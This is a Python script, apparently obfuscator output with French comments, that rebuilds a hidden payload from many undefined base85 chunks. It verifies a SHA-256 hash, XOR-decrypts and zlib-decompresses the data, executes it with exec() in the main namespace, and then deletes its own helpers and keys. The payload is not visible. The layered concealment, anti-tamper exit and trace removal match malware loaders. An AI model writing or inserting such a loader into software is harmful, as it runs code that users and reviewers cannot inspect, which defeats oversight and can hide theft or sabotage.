_pvAAnRiAP_OylD = __import__('base64').b85decode(_cjbu99UioIm4Y6 + _ca4IDQqlXVG74v + _c_caFk0Nbx7CTa + _clYHq6BEtHwexo + _cxVGkRv9qyentf + _cqWY5K3eLQ76Jd + _cw4Ts735G1mVXk + _cyaqwXDvp12L4b + _cz5_LxwZOOxCsU + _chd_QF25gQzNbm + _cdveG5yLYXVlkB + _crMJJcoP9t3cPc + _ch4BZCvdu6KaW6 + _cgDuHYKLP01rE1 + _cwIjdrz_pCxPXM + _coE4C2oVVkUKn4 + _cy4rtqmWV8xtFm + _cssDsj_80XT9Kx + _clMlsAl7ReB8Xr + _cxssf0HfJX0Szf + _cdnCOsH59tIvv9 + _cdjivOi_MWeMMI + _cgqigOE_2JazFn + _cqbdAcYd2Llz42 + _cfVJIOHJo8uPQy + _csklFd6FIXoX3r + _ceEKkmYI81UBvX + _coRRbkaNT3jFsN + _cvK9zuW1fNLwwn + _ci2_E7AcUQUFXv + _cheHnMNkrUioNB + _ceTCzx1VX0x6K1 + _cwjzRwbZv_rzZq + _ceeepvLVqbsRb1 + _cnqa0SKjk1M08S + _cskOjbvuV8f31u + _cbofPQHwKpacRv + _cpjWQK0IwxZpQ0 + _ckvbRUl0trtwmr + _cxGXOsZ6JzR3gP + _cdYdq3NPAVI0Bz + _cgTaRuKpXnXUyD + _czoWU95XXUiMiN + _c_sKzlpqlNVR9q + _crqY3A_wehuZaT + _ch5Tff_wiYvkpo + _cjIR1VMZxK48IS + _chpHk5hEEvlRxp + _cnd0huBUPM24G8 + _cfAmQnkCJ1XwHO + _cmN4XCLLOLsU1C + _crorlJNAKWfCfT + _czz2Yx_lykYRPa + _cuFXuuIHhhpPde + _coPwamOdrMhHSv + _cczZb9Rw3xi0kB + _cy4Bae_LW9w9Gv + _cevR898wdd_cUv + _cdjEXStc0SO2bZ + _cahebhP1UvbFrG + _ctp3VHK8b4fZKi + _cnsRPhwxpeczHB + _cp6xNWOhTSpYGu + _clK2L4vOlksUTk + _cgDCryeHwYE18d + _ch3W3urSLy1u9v + _cvC5rfbIoPlOoJ + _c_cXWshN4nhEEf + _c_t1kvj9080ssG + _chj3tGfu9UE56H + _cvCu3WJH77JR3A + _cm7P8cOeA02q1Q + _cjEt6QGnLraX98 + _cm7dCLaQLdwLxP + _cw0nhi8WtcBaXZ + _cdimUjBoSfCsyM + _cwRhU0Wto_SFhd + _cqi4LqAhqvLp4w + _cqSsKf7nZIzQ4Q + _ck7JFo0_Srz2g_ + _cawVs0yt83iRV5 + _cljSWbJGHFHpHt + _cxzHhq4MLHlK6m + _cewOKPytCg29mR + _ciIlG506t6EJoo + _cqzR5vdHbZuaqk + _clNI9wDfDz9bDx + _c_nGt2CJJa3XLY + _crI2OQMdUiNvsY + _cbEjZAlXLVkQTL + _cn0_hb_3ToMsv9 + _ci2g5zLfP2aeLA + _chvG6KEqbIGu4w + _cex1csJfjTpaJ8 + _cs8d3mIpZKpqPn + _cnhxLe69JM3hBm + _cb75VNFpVnh7y7 + _cnG48ISy0U4iGl + _cmUuxVrkvTwTsn + _cdhzB8K3n8tvGK + _cwL8OvMCx20Xs1 + _c_yl_6iDgeapZw + _cw7CzRGndWQEbo + _cfYRT3z0WF2UFf + _co_4AMCrHk6qmO + _cv2VlqdJePaw2l + _coIBMbluAQEtCP + _chLZ78Fogl_lk0 + _ccUc2Ztchtlk_S + _citQ0SlfJdjM8o + _ciBSg_quyNmadi + _cf3P9JMItIUy1k + _cdX2yg_2FSd5Lt + _c_8GqaLbMmrS8x + _caooxigGWJlpOV + _cnxnd8TAWnQN8Y + _cmzzJD3zgKezIH + _c_GDiXrnm3li3L + _ceMwAzfuCnXAJ3 + _c_3qSReAhZZ_On + _cktOd1CcGDASpQ + _cvdazdrR5uyqx5 + _cqlCj3gyoxF7Fy + _cskBID5u8IAiJT + _ciQPnX33HraNnV + _cuTfFsrR9kUb8B + _chZosttKVwiUuI + _cwnxgkexXpqORO + _cuGkvAhLV0z38l + _cv4nHFBt3Nt2TE + _cgGJoVwnUX36pH + _cozH0B_gFIXHlz + _cs6SPppC9Yle3e + _camHNSbslFc1xy + _cbvUe4oQIK2SMg + _cb1Cv8Wi38eC3l + _ckReh14afAeJWf + _cqlwbrfaB3OBPF + _cdmv0ZWWC1CpoA + _ce6R8KQYRg3T93 + _cs0oCqrWStUuFw + _cqqHTLrvkGx_DX + _ciE8WuwCUMsmxP + _cyz7XyHcWQNfQ3 + _cwHat_BM6djPvF + _clyDPUkR1eFTMM + _cwi9Yiq50YFMSq + _cauJG57hGQ_00w + _czvpxEfNlywUd3 + _crc1PPk_FwR599 + _ciKP2L4tLBlnM3 + _cxPpnFsCaffetC + _cyhNdKJ6Ch4d1E)
if __import__('hashlib').sha256(_pvAAnRiAP_OylD).hexdigest() != 'a566da501b999f84207dd7321964b55d8bad746f969a91d75dd4ea2e506d3a9c':
    __import__('sys').exit(1)
_xkkFlGfjF87jMW = bytes([59, 135, 28, 123, 213, 174, 66, 12, 252, 164, 91, 145, 132, 197, 231, 38, 171, 215, 40, 203])
_fkdy0u8IcfCjMWJ = bytes([226, 196, 71, 82, 149, 175, 131, 252, 104, 231, 116, 21, 0, 44, 232, 79, 7, 221, 28, 65])

def _fxty7w4MBlpk8UD(_bvTFjfGgpO9eex, _kf_t1wIdSSWMXj):
    return bytes(_bvTFjfGgpO9eex[_izWg2uzjnSbonJ] ^ _kf_t1wIdSSWMXj[_izWg2uzjnSbonJ % len(_kf_t1wIdSSWMXj)] for _izWg2uzjnSbonJ in range(len(_bvTFjfGgpO9eex)))

def _fdoEra2W3R4FJFQ(_tlUSBac6dwDfDh):
    import zlib
    return zlib.decompress(_tlUSBac6dwDfDh) # Un seul niveau de zlib ici pour simplifier

def _febcpRrc3cwJpwa():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xh_DEbbDptCd8T = _fxty7w4MBlpk8UD(_pvAAnRiAP_OylD, _xkkFlGfjF87jMW)
    # 2. Décompression Zlib
    _drvlyGvklTkyBB = _fdoEra2W3R4FJFQ(_xh_DEbbDptCd8T)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _drvlyGvklTkyBB.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nfl9shkH275YUf = _main.__dict__
    _nfl9shkH275YUf.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nfl9shkH275YUf)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_febcpRrc3cwJpwa()
try:
    del _fxty7w4MBlpk8UD, _fdoEra2W3R4FJFQ, _febcpRrc3cwJpwa
    del _pvAAnRiAP_OylD, _xkkFlGfjF87jMW, _fkdy0u8IcfCjMWJ
except:
    pass
